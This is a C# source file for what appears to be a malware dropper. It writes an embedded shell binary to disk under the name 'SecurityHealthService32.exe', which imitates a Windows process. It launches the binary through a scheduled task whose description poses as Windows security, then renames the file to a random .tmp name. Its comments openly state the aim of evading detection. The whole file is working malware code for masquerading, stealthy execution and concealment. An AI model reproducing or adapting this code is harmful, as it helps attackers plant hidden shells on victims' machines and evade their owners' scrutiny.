using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32.TaskScheduler;

namespace ShellManagerService
{
    public partial class ShellManager
    { 
        public const int tmp_name_length = 16;
        public const string exe_name = "SecurityHealthService32.exe";
        private static Random random = new Random();

        public static string old_tmp_name { get; set; }
        public static void LoadShellInDisk()
        {
            //Call the process audiodb since people are dumb as fuck when looking for it on google will lead to audiodg.exe which is a legitimate Windows executable
            string tmp_name = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, exe_name);

            //Check if shell is already running
            Process[] pname = Process.GetProcessesByName(exe_name);
            if(pname.Length > 0) //Shell is running
            {
                return;
            }
            //else delete the file
            File.Delete(tmp_name);

            if (!File.Exists(old_tmp_name)) //If temp file gets deleted create a new one
            {
                File.Create(tmp_name);
            }
            else //else rename temp file
            {
                File.Move(old_tmp_name, tmp_name);
            }

            while (true)
            {
                try
                {
                    //Write bytes into file
                    FileStream fs = new FileStream(tmp_name,
                                           FileMode.Open,
                                           FileAccess.Write);
                    fs.Write(shell_image, 0, shell_image.Length);
                    fs.Close();
                    break;
                }
                catch
                {

                }
            }

            //Start process
            StartProcess(tmp_name);

            Thread.Sleep(10000);

            //Rename the file changing the extension to .tmp to avoid suspicion in case someone opens the folder I guess(?)
            old_tmp_name = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, RandomModuleName(tmp_name_length));
            File.Move(tmp_name, old_tmp_name);
        }
        //Give the module a random ass name idk
        public static string RandomModuleName(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return (new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray()) + ".tmp");
        }
        //Services run as User 0, therefore cannot start other processes. A possible bypass is to schedule a single run Task for the executable :)
        public static void StartProcess(string file_path)
        {
            using (var ts = new TaskService())
            {
                var t = ts.Execute(file_path)
                    .Once()
                    .Starting(DateTime.Now.AddSeconds(5))
                    .AsTask("Windows security manager service is used to check health and integrity of important system resources.");
            }
        }
    }
}
